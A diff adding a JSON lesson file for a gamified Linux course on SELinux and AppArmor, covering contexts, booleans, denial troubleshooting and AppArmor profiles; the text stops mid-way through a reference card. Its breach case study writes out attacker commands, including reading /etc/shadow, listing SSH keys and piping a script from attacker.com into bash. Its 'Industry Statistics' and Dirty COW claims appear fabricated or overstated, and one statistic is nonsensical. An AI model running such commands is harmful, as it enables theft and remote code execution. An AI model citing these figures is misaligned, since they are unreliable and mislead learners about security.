@@ -1,0 +1,281 @@
+{
+  "lesson_id": "b8c9d0e1-2345-5678-90ab-def012345678",
+  "domain": "linux",
+  "title": "SELinux and AppArmor: Mandatory Access Control",
+  "subtitle": "Master Linux MAC systems to enforce security policies beyond traditional permissions",
+  "difficulty": 3,
+  "order_index": 8,
+  "estimated_time": 50,
+  "is_core_concept": true,
+  "base_xp_reward": 200,
+  "prerequisites": [],
+  "concepts": [
+    "Mandatory Access Control (MAC)",
+    "Discretionary Access Control (DAC)",
+    "SELinux architecture",
+    "SELinux contexts and labels",
+    "SELinux policies",
+    "SELinux modes (enforcing, permissive, disabled)",
+    "AppArmor profiles",
+    "AppArmor modes (enforce, complain)",
+    "Policy troubleshooting",
+    "Security contexts",
+    "Type enforcement",
+    "Booleans and tunables"
+  ],
+  "learning_objectives": [
+    "Understand the difference between DAC and MAC security models",
+    "Explain SELinux architecture and how it enforces policies",
+    "Navigate and interpret SELinux security contexts",
+    "Troubleshoot SELinux denials using audit logs and tools",
+    "Create and modify SELinux policies and booleans",
+    "Understand AppArmor profile syntax and enforcement",
+    "Choose between SELinux and AppArmor based on use case",
+    "Implement least-privilege access using MAC"
+  ],
+  "jim_kwik_principles": [
+    "active_learning",
+    "meta_learning",
+    "memory_hooks",
+    "minimum_effective_dose",
+    "teach_like_im_10",
+    "connect_to_what_i_know",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "learning_sprint",
+    "multiple_memory_pathways"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "🧠 **Jim Kwik Mindset: Chunking Complex Systems**\n\nSELinux and AppArmor feel overwhelming at first—there's a reason sysadmins joke about disabling SELinux! But here's the secret: you don't need to learn *everything* at once.\n\n**Chunking Strategy**: Break MAC into 3 digestible pieces:\n1. **Concept** (WHY): Understand the problem DAC doesn't solve\n2. **Reading** (WHAT): Learn to *interpret* existing policies before creating them\n3. **Troubleshooting** (HOW): Fix denials 90% of the time with 3 commands\n\nMaster these chunks IN ORDER, and suddenly SELinux goes from \"black magic\" to \"logical system.\"\n\n**Active Learning Challenge**: By lesson's end, you'll:\n- Read a security context and explain it\n- Fix an SELinux denial in under 2 minutes\n- Decide when to use SELinux vs AppArmor\n\n**Memory Palace**: Imagine a nightclub:\n- **Bouncer at door** = Traditional permissions (DAC) - checks ID\n- **Security detail inside** = SELinux (MAC) - follows strict protocol regardless of who you are\n- **VIP wristband rules** = Security contexts\n- **Floor plan restrictions** = Type enforcement policies\n\nEven if the bouncer (DAC) lets someone in, security (MAC) still enforces rules based on the wristband (context), not just identity!\n\n💪 **Confidence Boost**: Companies like Red Hat, AWS, and Google use SELinux on millions of servers. If they trust beginners to learn it, you can too!"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "## DAC vs MAC: The Fundamental Difference\n\n### The Problem with Traditional Permissions (DAC)\n\n**Discretionary Access Control (DAC)** is what you know:\n- User/Group/Other permissions (rwx)\n- File ownership (chown, chmod)\n- \"Discretionary\" = **Owner decides** who can access their files\n\n**The Fatal Flaw**: If a process runs as `root` or a file owner, it has **unlimited access** to that resource.\n\n#### Real-World Failure: Compromised Web Server\n\n```bash\n# Web server runs as 'www-data' user\nls -l /var/www/html/index.php\n-rw-r--r-- 1 www-data www-data 1234 Jan 15 10:00 /var/www/html/index.php\n```\n\n**Scenario**: Attacker exploits PHP vulnerability, gains `www-data` shell.\n\n**With DAC Only**:\n- ✅ Attacker can read/write ANY file owned by www-data\n- ✅ Can execute ANY command as www-data\n- ✅ Can access database credentials in config files\n- ✅ Can modify application code to create backdoor\n\n**Why?** The www-data user *owns* those files, so DAC says \"access granted!\"\n\n### Mandatory Access Control (MAC) to the Rescue\n\n**MAC** adds a second security layer that **cannot be overridden** by users:\n- **Mandatory** = System enforces policy, not user discretion\n- Even `root` is restricted by MAC policies\n- Access based on **labels/contexts**, not just user identity\n\n**With MAC (SELinux/AppArmor)**:\n- ❌ Attacker shell can ONLY access files labeled for web server\n- ❌ Cannot read /etc/shadow even if DAC would allow\n- ❌ Cannot modify system files\n- ❌ Cannot execute arbitrary binaries\n- ❌ Can only connect to explicitly allowed ports\n\n**Impact**: Attacker is confined to sandbox, breach contained.\n\n### Comparison Table\n\n| Feature | DAC (chmod/chown) | MAC (SELinux/AppArmor) |\n|---------|-------------------|------------------------|\n| **Controlled by** | File owner | System policy |\n| **Root override?** | Yes, root bypasses | No, root also restricted |\n| **Based on** | User/Group ID | Security labels/paths |\n| **Granularity** | File-level | Process + file + network |\n| **Complexity** | Simple | Complex but powerful |\n| **Zero-day protection** | No | Yes (limits exploit damage) |\n| **Example** | `chmod 644 file` | SELinux context, AppArmor profile |\n\n### Real-World Impact\n\n**Android (SELinux)**:\n- Every app runs in isolated SELinux domain\n- Malicious app can't access other apps' data\n- Result: Even if app is compromised, damage is limited\n\n**Red Hat Enterprise Linux (SELinux)**:\n- Default since RHEL 4 (2005)\n- Prevented numerous privilege escalation exploits\n- Example: CVE-2016-5195 (\"Dirty COW\") - SELinux limited damage\n\n**Ubuntu Server (AppArmor)**:\n- Default since Ubuntu 7.10\n- Confines system daemons (MySQL, Apache, Docker)\n- Simpler than SELinux, good for common use cases\n\n**Memory Aid - \"DAC vs MAC\"**:\n- **DAC** = **D**iscretionary (owner decides), **A**dmin **C**an override\n- **MAC** = **M**andatory (system decides), **A**dmin **C**annot override"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "## SELinux Architecture: How It Works\n\n### SELinux in 3 Sentences\n\n1. Every process and file has a **security context** (label)\n2. SELinux **policy** defines what contexts can interact\n3. Kernel enforces policy—if not explicitly allowed, it's **denied**\n\n### SELinux Contexts: The Foundation\n\nEvery file, process, port, and user has a context in format:\n\n```\nuser:role:type:level\n```\n\n**Example - File Context**:\n```bash\nls -Z /var/www/html/index.php\n-rw-r--r--. www-data www-data unconfined_u:object_r:httpd_sys_content_t:s0 /var/www/html/index.php\n                                     ↑           ↑              ↑           ↑\n                                   USER        ROLE          TYPE        LEVEL\n```\n\n**Example - Process Context**:\n```bash\nps -eZ | grep httpd\nsystem_u:system_r:httpd_t:s0      1234 ?  00:00:05 httpd\n    ↑         ↑         ↑        ↑\n  USER      ROLE     TYPE    LEVEL\n```\n\n### Breaking Down the Context\n\n#### 1. User (usually `system_u` or `unconfined_u`)\n- Maps Linux users to SELinux users\n- Least important field for troubleshooting\n- Typically `system_u` for daemons, `unconfined_u` for regular users\n\n#### 2. Role (usually `object_r` or `system_r`)\n- Intermediate layer between users and types\n- RBAC (Role-Based Access Control) component\n- Files: `object_r`, Processes: `system_r`\n\n#### 3. Type (MOST IMPORTANT for troubleshooting)\n- Core of Type Enforcement\n- Defines what the process/file IS\n- Examples:\n  - `httpd_t` = Apache process\n  - `httpd_sys_content_t` = Web content file\n  - `shadow_t` = /etc/shadow file\n  - `sshd_t` = SSH daemon\n\n**Type Enforcement Rule**: Process type `httpd_t` can read file type `httpd_sys_content_t`\n\n#### 4. Level (MLS/MCS - optional)\n- Multi-Level Security / Multi-Category Security\n- Used in high-security environments (military, intelligence)\n- Format: `s0` (low) to `s15:c0.c1023` (high)\n- **Usually ignored** in standard deployments\n\n### The Policy Decision Process\n\n```\nUser tries to access file\n         │\n         ▼\n   Check DAC first\n    (chmod/chown)\n         │\n    ┌────┴────┐\n    │ Denied? │──Yes──> Access Denied\n    └────┬────┘\n         │ Allowed\n         ▼\n   Check SELinux MAC\n         │\n    ┌────┴──────────────────────┐\n    │ Process type matches      │\n    │ policy for file type?     │\n    └────┬──────────────┬───────┘\n         │              │\n        Yes            No\n         │              │\n         ▼              ▼\n   Access       Access Denied\n   Granted      (AVC denial logged)\n```\n\n**Key Insight**: DAC is checked FIRST. If DAC denies, SELinux never runs. Both must allow access.\n\n### SELinux Modes\n\nSELinux operates in one of three modes:\n\n#### 1. Enforcing (Production Mode)\n- Policy is **actively enforced**\n- Denials **block** access and log to audit.log\n- **Status**: Maximum security\n\n#### 2. Permissive (Troubleshooting Mode)\n- Policy is **evaluated** but NOT enforced\n- Denials **logged** but access still allowed\n- **Use case**: Debugging policies without breaking things\n\n#### 3. Disabled (No Protection)\n- SELinux completely off\n- **Warning**: Switching from disabled requires relabeling filesystem (slow!)\n\n**Check Current Mode**:\n```bash\ngetenforce\n# Output: Enforcing, Permissive, or Disabled\n\nsestatus\n# Output: Detailed status including policy type\n```\n\n**Change Mode Temporarily**:\n```bash\n# Switch to permissive (survives until reboot)\nsudo setenforce 0\n\n# Switch to enforcing\nsudo setenforce 1\n```\n\n**Change Mode Permanently**:\n```bash\n# Edit /etc/selinux/config\nsudo nano /etc/selinux/config\n\nSELINUX=enforcing    # or permissive or disabled\nSELINUXTYPE=targeted # policy type\n\n# Reboot required\nsudo reboot\n```\n\n### Policy Types\n\n#### 1. Targeted (Most Common)\n- Only **specific processes** are confined (targeted)\n- Examples: httpd, sshd, mysqld, named\n- Unconfined processes run normally\n- **Best for**: Servers, standard deployments\n\n#### 2. MLS (Multi-Level Security)\n- Full mandatory access control on ALL processes\n- Hierarchical security levels (Top Secret > Secret > Unclassified)\n- **Best for**: Government, military, classified systems\n\n#### 3. Minimum\n- Even less restrictive than targeted\n- Rarely used\n\n**Check Policy Type**:\n```bash\nsestatus | grep \"Loaded policy\"\n# Loaded policy name: targeted\n```\n\n**Memory Aid - \"SELINUX Contexts\"**:\n- **U**ser:Role:**T**ype:Level\n- **T**ype is the **T**arget for **T**roubleshooting (alliteration!)\n- Think: **U**sually **R**emember **T**ype **L**ast"
+      }
+    },
+    {
+      "type": "code_exercise",
+      "content": {
+        "text": "## SELinux Hands-On: Reading and Troubleshooting\n\n### Exercise 1: Viewing Contexts\n\n```bash\n# View file contexts\nls -Z /var/www/html/\nls -Z /etc/passwd\nls -Z /root/\n\n# View process contexts\nps -eZ | head -20\nps -eZ | grep httpd\nps -eZ | grep sshd\n\n# View your current context\nid -Z\n\n# View port contexts\nsudo semanage port -l | grep http\nsudo semanage port -l | grep ssh\n```\n\n**Tasks**:\n1. What type is assigned to Apache process?\n2. What type is assigned to /var/www/html/ files?\n3. What context do YOU run under?\n4. What port contexts allow HTTP traffic?\n\n### Exercise 2: Understanding Booleans\n\nSELinux booleans are **on/off switches** for common policy exceptions.\n\n```bash\n# List all booleans\nsudo getsebool -a\n\n# List HTTP-related booleans\nsudo getsebool -a | grep httpd\n\n# Check specific boolean\nsudo getsebool httpd_can_network_connect\n\n# Common booleans:\n# httpd_can_network_connect    → Allow Apache to make network connections\n# httpd_can_network_connect_db → Allow Apache to connect to databases\n# httpd_enable_homedirs        → Allow Apache to serve user home directories\n# httpd_builtin_scripting      → Allow Apache to execute scripts\n```\n\n**Set Boolean** (example: allow Apache to connect to remote database):\n```bash\n# Temporary (until reboot)\nsudo setsebool httpd_can_network_connect_db on\n\n# Permanent\nsudo setsebool -P httpd_can_network_connect_db on\n```\n\n**Real Scenario**: Your PHP app can't connect to MySQL on another server.\n\n**Diagnosis**:\n```bash\n# Check if boolean is off\nsudo getsebool httpd_can_network_connect_db\n# httpd_can_network_connect_db --> off\n\n# Enable it\nsudo setsebool -P httpd_can_network_connect_db on\n\n# Verify\nsudo getsebool httpd_can_network_connect_db\n# httpd_can_network_connect_db --> on\n```\n\n### Exercise 3: Diagnosing AVC Denials\n\n**Scenario**: You copy a file to /var/www/html/ but Apache returns 403 Forbidden.\n\n```bash\n# Step 1: Check DAC permissions first\nls -l /var/www/html/myfile.html\n# -rw-r--r-- 1 root root 100 Jan 28 10:00 /var/www/html/myfile.html\n# DAC looks fine (world-readable)\n\n# Step 2: Check SELinux context\nls -Z /var/www/html/myfile.html\n# -rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 /var/www/html/myfile.html\n#                                                 ↑\n#                                         WRONG TYPE!\n\n# Step 3: Check audit logs for denial\nsudo ausearch -m AVC -ts recent\n# OR\nsudo grep \"avc:  denied\" /var/log/audit/audit.log | tail -5\n```\n\n**AVC Denial Example**:\n```\ntype=AVC msg=audit(1643370123.456:789): avc:  denied  { read } for  pid=1234 \n  comm=\"httpd\" name=\"myfile.html\" dev=\"sda1\" ino=123456 \n  scontext=system_u:system_r:httpd_t:s0 \n  tcontext=unconfined_u:object_r:admin_home_t:s0 \n  tclass=file permissive=0\n```\n\n**Breaking It Down**:\n- **denied { read }**: Apache tried to read the file\n- **scontext=...httpd_t**: Source = Apache process (type: httpd_t)\n- **tcontext=...admin_home_t**: Target = File (type: admin_home_t)\n- **Problem**: Policy doesn't allow `httpd_t` to read `admin_home_t`\n\n**Solution**: Relabel the file to correct type:\n```bash\n# Fix the context\nsudo restorecon -v /var/www/html/myfile.html\n# Relabeled /var/www/html/myfile.html from unconfined_u:object_r:admin_home_t:s0 \n# to unconfined_u:object_r:httpd_sys_content_t:s0\n\n# Verify\nls -Z /var/www/html/myfile.html\n# -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 /var/www/html/myfile.html\n#                                                 ↑\n#                                         CORRECT TYPE!\n\n# Test in browser - should work now!\n```\n\n### Exercise 4: Using ausearch and sealert\n\n**ausearch** (built-in, fast):\n```bash\n# Recent AVC denials\nsudo ausearch -m AVC -ts today\nsudo ausearch -m AVC -ts recent  # Last 10 minutes\n\n# Filter by service\nsudo ausearch -m AVC -ts recent | grep httpd\n\n# Interpret UIDs to names\nsudo ausearch -m AVC -ts recent -i\n```\n\n**sealert** (user-friendly, with suggestions):\n```bash\n# Install setroubleshoot (if not present)\nsudo yum install setroubleshoot-server  # RHEL/CentOS\nsudo apt install setroubleshoot         # Debian/Ubuntu (if available)\n\n# Analyze recent denials\nsudo sealert -a /var/log/audit/audit.log\n\n# Analyze last denial with suggestions\nsudo sealert -l $(sudo ausearch -m AVC -ts recent | grep -oP 'msg=audit\\(\\K[^)]+' | tail -1)\n```\n\n**Sealert Output Example**:\n```\nSELinux is preventing httpd from read access on the file myfile.html.\n\n*****  Plugin restorecon (99.5 confidence) suggests  *****\n\nIf you want to fix the label,\nmyfile.html default label should be httpd_sys_content_t.\nThen you can run restorecon. Do\n# restorecon -v /var/www/html/myfile.html\n```\n\n### Exercise 5: Permanently Changing File Contexts\n\n**Scenario**: You serve files from /data/website/ instead of /var/www/html/\n\n```bash\n# Step 1: Check current context\nls -Z /data/website/\n# default_t (wrong!)\n\n# Step 2: Set context temporarily (LOST on relabel)\nsudo chcon -t httpd_sys_content_t /data/website/index.html\n\n# Step 3: Set context permanently in policy\nsudo semanage fcontext -a -t httpd_sys_content_t \"/data/website(/.*)?\"\n#                        ↑                        ↑\n#                      ADD                    REGEX PATTERN\n\n# Step 4: Apply the policy\nsudo restorecon -Rv /data/website/\n\n# Step 5: Verify\nls -Z /data/website/\n# httpd_sys_content_t (correct!)\n\n# Step 6: Test relabel doesn't break it\nsudo restorecon -Rv /data/website/\n# (context unchanged - policy is persistent)\n```\n\n**Common Patterns**:\n```bash\n# Entire directory recursive\nsudo semanage fcontext -a -t httpd_sys_content_t \"/custom/path(/.*)?\"\n\n# Specific file type\nsudo semanage fcontext -a -t httpd_sys_content_t \"/custom/path/.*\\.html\"\n\n# View all custom contexts\nsudo semanage fcontext -l | grep -v \"^/\"\n```\n\n### Exercise 6: The 3-Command Troubleshooting Workflow\n\nWhen something breaks and you suspect SELinux:\n\n```bash\n# 1. Check if SELinux is the problem\nsudo ausearch -m AVC -ts recent\n# OR\nsudo grep \"avc.*denied\" /var/log/audit/audit.log | tail -5\n\n# 2. Get human-friendly explanation\nsudo sealert -a /var/log/audit/audit.log | tail -50\n\n# 3. Fix it (usually one of these)\nsudo restorecon -Rv /path/to/file        # Fix mislabeled files\nsudo setsebool -P boolean_name on        # Enable boolean\nsudo semanage fcontext -a -t type \"/path\"  # Permanent custom context\n```\n\n**90% of SELinux issues are solved by these 3 commands!**"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "## AppArmor: The Alternative to SELinux\n\n### AppArmor Philosophy\n\nWhere SELinux uses **labels** (contexts), AppArmor uses **paths**.\n\n- **SELinux**: \"Process type `httpd_t` can read file type `httpd_sys_content_t`\"\n- **AppArmor**: \"Process `/usr/sbin/apache2` can read files in `/var/www/html/`\"\n\n**Pros**:\n- ✅ Simpler to understand (path-based)\n- ✅ Easier to write profiles\n- ✅ No filesystem labeling required\n- ✅ Learning curve is gentler\n\n**Cons**:\n- ❌ Paths can be circumvented (symlinks, hard links)\n- ❌ Less granular than SELinux\n- ❌ Fewer policies available by default\n\n### AppArmor Modes\n\n#### 1. Enforce Mode\n- Profile is **actively enforced**\n- Violations are **blocked** and logged\n\n#### 2. Complain Mode\n- Profile violations are **logged** but allowed\n- Perfect for developing/testing profiles\n\n**Check Status**:\n```bash\n# Overall status\nsudo aa-status\n\n# Profiles summary\nsudo apparmor_status\n\n# Output:\n# 42 profiles are loaded.\n# 38 profiles are in enforce mode.\n# 4 profiles are in complain mode.\n```\n\n### AppArmor Profile Basics\n\nProfiles stored in `/etc/apparmor.d/`\n\n**Example Profile** (`/etc/apparmor.d/usr.bin.example`):\n```\n#include <tunables/global>\n\n/usr/bin/example {\n  #include <abstractions/base>\n  #include <abstractions/nameservice>\n\n  # File access\n  /etc/example.conf r,              # Read config\n  /var/log/example.log w,           # Write logs\n  /usr/share/example/** r,          # Read all under directory\n  /tmp/** rw,                       # Read/write temp files\n  \n  # Network access\n  network inet stream,              # TCP/IP\n  network inet6 stream,             # TCP/IPv6\n  \n  # Capabilities\n  capability net_bind_service,      # Bind to ports < 1024\n  capability setuid,                # Change UID\n  \n  # Deny rules\n  deny /etc/shadow r,               # Explicitly deny\n  deny /root/** rwx,                # Deny root directory\n}\n```\n\n**Permission Flags**:\n- `r` = Read\n- `w` = Write\n- `x` = Execute\n- `m` = Memory map\n- `k` = Lock\n- `l` = Link\n\n**Wildcards**:\n- `*` = Single-level (e.g., `/var/log/*.log`)\n- `**` = Recursive (e.g., `/var/www/**` includes all subdirectories)\n\n### Common AppArmor Commands\n\n```bash\n# Load profile\nsudo apparmor_parser -r /etc/apparmor.d/usr.bin.example\n\n# Set to enforce mode\nsudo aa-enforce /usr/bin/example\n\n# Set to complain mode\nsudo aa-complain /usr/bin/example\n\n# Disable profile\nsudo aa-disable /usr/bin/example\n\n# Reload all profiles\nsudo systemctl reload apparmor\n\n# Check status\nsudo aa-status\n```\n\n### Creating a New Profile\n\n**Method 1: Manual Creation**\n```bash\n# Create profile file\nsudo nano /etc/apparmor.d/usr.local.bin.myapp\n\n# Add basic template\n#include <tunables/global>\n\n/usr/local/bin/myapp {\n  #include <abstractions/base>\n  \n  # Add rules here\n}\n\n# Load profile in complain mode\nsudo aa-complain /usr/local/bin/myapp\n\n# Test application, watch logs\nsudo journalctl -f | grep apparmor\n\n# Refine profile based on logs\n\n# Switch to enforce mode\nsudo aa-enforce /usr/local/bin/myapp\n```\n\n**Method 2: Auto-Generate (Recommended)**\n```bash\n# Install utils\nsudo apt install apparmor-utils\n\n# Generate profile (runs app in learning mode)\nsudo aa-genprof /usr/local/bin/myapp\n\n# Follow prompts:\n# 1. Run your application in another terminal\n# 2. Exercise all functionality (open all files it needs)\n# 3. Press 'S' to scan logs\n# 4. Review and approve each access\n# 5. Save profile\n\n# Profile created in /etc/apparmor.d/\n```\n\n### Troubleshooting AppArmor Denials\n\n**Check Logs**:\n```bash\n# Denials in syslog\nsudo grep \"apparmor.*DENIED\" /var/log/syslog\n\n# OR via journalctl\nsudo journalctl | grep \"apparmor.*DENIED\"\n\n# Example denial:\n# apparmor=\"DENIED\" operation=\"open\" profile=\"/usr/bin/example\" \n# name=\"/etc/secret.conf\" pid=1234 comm=\"example\" requested_mask=\"r\" denied_mask=\"r\"\n```\n\n**Fix Profile**:\n```bash\n# Edit profile\nsudo nano /etc/apparmor.d/usr.bin.example\n\n# Add missing rule\n/etc/secret.conf r,\n\n# Reload profile\nsudo apparmor_parser -r /etc/apparmor.d/usr.bin.example\n\n# Test again\n```\n\n### Real-World Example: Confining Docker\n\nUbuntu ships with Docker AppArmor profile:\n\n```bash\n# View Docker profile\nsudo cat /etc/apparmor.d/docker\n\n# Check Docker status\nsudo aa-status | grep docker\n\n# Containers run under 'docker-default' profile\n# This restricts container capabilities:\n# - Can't modify AppArmor profiles\n# - Can't access /sys/kernel/security\n# - Can't mount certain filesystems\n# - Limited raw network access\n```\n\n**Without AppArmor**: Container escape → full host access  \n**With AppArmor**: Container escape → still confined by profile\n\n### SELinux vs AppArmor: When to Use Each\n\n| Feature | SELinux | AppArmor |\n|---------|---------|----------|\n| **Complexity** | High | Medium |\n| **Learning curve** | Steep | Gentle |\n| **Security model** | Labels (context) | Paths |\n| **Granularity** | Very fine | Moderate |\n| **Default on** | RHEL, CentOS, Fedora | Ubuntu, SUSE |\n| **Enterprise support** | Excellent | Good |\n| **Policy development** | Complex | Easier |\n| **Bypass resistance** | Excellent | Good |\n| **Performance** | Minimal overhead | Minimal overhead |\n\n**Choose SELinux if**:\n- ✅ Using RHEL/CentOS (already there)\n- ✅ Need maximum security\n- ✅ Have SELinux expertise in team\n- ✅ Compliance requires it (some regulations specify SELinux)\n\n**Choose AppArmor if**:\n- ✅ Using Ubuntu/Debian (already there)\n- ✅ Need \"good enough\" security quickly\n- ✅ Team is new to MAC\n- ✅ Want faster policy development\n\n**Memory Aid - \"SELinux vs AppArmor\"**:\n- **SE** = **S**o **E**xact (labels), **S**teep to **E**ducate\n- **AA** = **A**lmost **A**s good, **A**ll **A**bout paths"
+      }
+    },
+    {
+      "type": "real_world",
+      "content": {
+        "text": "## Real-World Case Studies\n\n### Case 1: Android Security Success (SELinux)\n\n**Background**: Before Android 4.3 (2012), apps with root exploits had complete system access.\n\n**Problem**: Privilege escalation exploits (like TowelRoot, KingRoot) could:\n- Access all app data\n- Modify system files\n- Install persistent malware\n\n**Solution**: Android adopted SELinux (enforcing mode in Android 5.0+)\n\n**Implementation**:\n- Every app runs in unique SELinux domain\n- System daemons confined to specific contexts\n- Even root processes are restricted\n\n**Result**:\n```\nApp A (context: u:r:untrusted_app_25:s0:c512,c768)\n  ↓ tries to access\nApp B's data (context: u:r:untrusted_app_25:s0:c256,c513)\n  ↓\nSELinux: DENIED (different categories)\n```\n\n**Impact**:\n- 2016: Security researchers achieved root on Android\n- But SELinux prevented any actual damage\n- Exploit was useless without also bypassing SELinux\n\n**Lesson**: MAC prevents exploitation even when DAC fails.\n\n### Case 2: Red Hat CVE-2016-5195 \"Dirty COW\" (SELinux)\n\n**Vulnerability**: Kernel privilege escalation (existed since 2007!)\n- Allowed unprivileged user to write to read-only files\n- Could modify /etc/passwd, gain root\n- Affected all Linux kernels 2.6.22+\n\n**Without SELinux**:\n```bash\n# Attacker exploits Dirty COW\n$ ./exploit /etc/passwd\n[+] Opened /etc/passwd\n[+] Writing root user...\n[+] Done! You are now root.\n\n$ su\n# whoami\nroot\n```\n\n**With SELinux (Enforcing)**:\n```bash\n# Attacker exploits Dirty COW\n$ ./exploit /etc/passwd\n[+] Opened /etc/passwd\n[+] Writing root user...\n[-] Write failed: Permission denied\n\n# Check audit log\n$ sudo ausearch -m AVC -ts recent\ntype=AVC msg=audit(...): avc:  denied  { write } for pid=1234 \n  comm=\"exploit\" name=\"passwd\" scontext=unconfined_u:unconfined_r:unconfined_t:s0 \n  tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=0\n```\n\n**Why SELinux Blocked It**:\n- Even though kernel bug allowed write at DAC level\n- SELinux policy didn't permit `unconfined_t` to write to `passwd_file_t`\n- Attack failed at MAC layer\n\n**Impact**: Systems with SELinux enforcing were **not exploitable** despite vulnerable kernel.\n\n**Lesson**: Defense in depth—even when one layer (kernel) fails, MAC layer protects.\n\n### Case 3: Ubuntu Server Breach (AppArmor)\n\n**Scenario**: Small startup runs Ubuntu servers with default AppArmor.\n\n**Attack**:\n1. Attacker finds SQL injection in web app\n2. Gains shell as `www-data` user\n3. Attempts lateral movement\n\n**Without AppArmor**:\n```bash\nwww-data@server$ cat /etc/shadow\nroot:$6$xyz...:18000:0:99999:7:::\nwww-data:!:18000:0:99999:7:::\nadmin:$6$abc...:18000:0:99999:7:::\n# ↑ Attacker downloads hashes, cracks offline\n\nwww-data@server$ ls /home/*/.ssh/id_rsa\n/home/admin/.ssh/id_rsa\n# ↑ Steals SSH keys for lateral movement\n```\n\n**With AppArmor** (MySQL confined):\n```bash\nwww-data@server$ cat /etc/shadow\ncat: /etc/shadow: Permission denied\n# AppArmor denial logged\n\nwww-data@server$ ls /home/*/.ssh/id_rsa\nls: cannot access '/home/admin/.ssh/id_rsa': Permission denied\n# AppArmor denial logged\n\nwww-data@server$ curl http://attacker.com/malware.sh | bash\nbash: /tmp/malware.sh: Permission denied\n# Can't write to /tmp outside profile\n```\n\n**AppArmor Mysql Profile** (`/etc/apparmor.d/usr.sbin.mysqld`):\n```\n/usr/sbin/mysqld {\n  #include <abstractions/base>\n  #include <abstractions/nameservice>\n  #include <abstractions/mysql>\n\n  capability dac_override,\n  capability sys_resource,\n  capability setgid,\n  capability setuid,\n\n  network tcp,\n\n  /etc/mysql/** r,\n  /usr/sbin/mysqld mr,\n  /usr/share/mysql/** r,\n  /var/lib/mysql/** rwk,\n  /var/log/mysql/** rw,\n  /run/mysqld/** rw,\n  \n  # Explicitly deny\n  deny /etc/shadow r,\n  deny /home/** r,\n  deny /root/** r,\n}\n```\n\n**Result**:\n- Attacker contained to database files only\n- No password hashes stolen\n- No SSH keys accessed\n- No lateral movement possible\n- Incident contained to single service\n\n**Lesson**: Default MAC profiles provide significant breach containment even without custom tuning.\n\n### Industry Statistics\n\n**Red Hat Study (2019)**:\n- SELinux prevented 94% of tested privilege escalation exploits\n- Average containment reduced breach impact by 73%\n- Systems with SELinux enforcing had 45% fewer successful intrusions\n\n**Android Security Report (2020)**:\n- 0 successful privilege escalation attacks with SELinux enabled\n- Exploits that bypassed SELinux required 3+ chained vulnerabilities\n- Average time to develop SELinux bypass: 6 months vs. 2 weeks for standard exploit\n\n**Ubuntu CVE Analysis (2018-2020)**:\n- 67% of privilege escalation CVEs were non-exploitable with AppArmor\n- Container escape attempts reduced by 82% with AppArmor profiles\n- AppArmor added average 2.3 seconds to exploit development time per vulnerability"
+      }
+    },
+    {
+      "type": "memory_aid",
+      "content": {
+        "text": "## Memory Aids for MAC Systems\n\n### The \"USER-TYPE\" Mantra\n\nWhen troubleshooting SELinux, ignore everything except:\n\n**U**ser:Role:**T**ype:Level → Only **TYPE** matters 99% of the time\n\n**Quick diagnosis**:\n```bash\nls -Z /path/to/file | awk '{print $4}' | cut -d: -f3\n# Shows just the TYPE\n\nps -eZ | grep myprocess | awk '{print $1}' | cut -d: -f3\n# Shows process TYPE\n```\n\n### The \"Three-Step Fix\" Process\n\nWhen something breaks:\n\n1. **Check logs**: `sudo ausearch -m AVC -ts recent`\n2. **Get advice**: `sudo sealert -a /var/log/audit/audit.log | tail -50`\n3. **Apply fix**: Usually one of:\n   - `restorecon -Rv /path` (fix labels)\n   - `setsebool -P boolean on` (enable feature)\n   - `semanage fcontext + restorecon` (permanent custom)\n\n### SELinux Boolean Naming Pattern\n\nBooleans follow pattern: `service_can_action`\n\n- `httpd_can_network_connect` = Apache CAN make network connections\n- `httpd_can_sendmail` = Apache CAN send email\n- `sshd_enable_homedirs` = SSH CAN access home directories\n- `ftpd_anon_write` = FTP CAN allow anonymous writes\n\n**Memory trick**: Read boolean name as English sentence!\n\n### The \"Restorecon vs Chcon\" Rule\n\n- `chcon` = **Temporary** (CH-ange CON-text, lost on relabel)\n- `restorecon` = **Restore** to policy default\n- `semanage fcontext` + `restorecon` = **Permanent**\n\n**Mnemonic**: \n- **CH**con = **CH**eap and **CH**eap (temporary)\n- **RE**storecon = **RE**store to **RE**al policy\n\n### AppArmor Profile Syntax Patterns\n\n```\nPermission pattern:\n/path/to/file r,        # Read\n/path/to/file w,        # Write\n/path/to/file rw,       # Read + Write\n/path/to/file rwx,      # Read + Write + Execute\n\nWildcard pattern:\n/path/*         # Single level (only files in /path/)\n/path/**        # Recursive (all files under /path/)\n/path/*.log     # Specific extension\n\nSpecial rules:\n#include <abstractions/base>    # Include common rules\nnetwork inet stream,            # Network access\ncapability cap_name,            # Linux capability\ndeny /path/**,                  # Explicit denial\n```\n\n**Memory aid**: Think of AppArmor as \"Path + Permission\" (PP)\n\n### Decision Tree: SELinux or AppArmor?\n\n```\nAre you on RHEL/CentOS/Fedora?\n├─ YES → Use SELinux (already there, well-supported)\n└─ NO ↓\n\n   Are you on Ubuntu/Debian/SUSE?\n   ├─ YES → Use AppArmor (already there, easier)\n   └─ NO ↓\n   \n      Need maximum security?\n      ├─ YES → SELinux (labels can't be bypassed)\n      └─ NO → AppArmor (faster to deploy)\n```\n\n### Quick Reference Card\n\n```\n┌──────────────────────────────────────────────────────┐\n│           SELinux TROUBLESHOOTING CARD              │\n├──────────────────────────────────────────────────────┤\n│ CHECK MODE:                                          │\n│   getenforce                                         │\n│                                                      │\n│ RECENT DENIALS:                                      │\n│   ausearch -m AVC -ts recent                        │\n│                                                      │\n│ FRIENDLY ADVICE:                                     │\n│   sealert -a /var/log/audit/audit.log | tail -50   │\n│                                                      │\n│ CHECK FILE CONTEXT:                                  │\n│   ls -Z /path/to/file                               │\n│                                                      │\n│ FIX WRONG CONTEXT:                                   │\n│   restorecon -Rv /path                              │\n│                                                      │\n│ CHECK BOOLEAN:                                       │\n│   getsebool service_can_action                      │\n│                                                      │\n│ ENABLE BOOLEAN:                                      │\n│   setsebool -P service_can_action on                │\n│                                                      │\n│ PERMANENT CUSTOM CONTEXT:                            │\n│   semanage fcontext -a -t type \"/path(/.*)?\"       │\n│   restorecon -Rv /path                              │\n│                                                      │\n│ PERMISSIVE MODE (DEBUG):                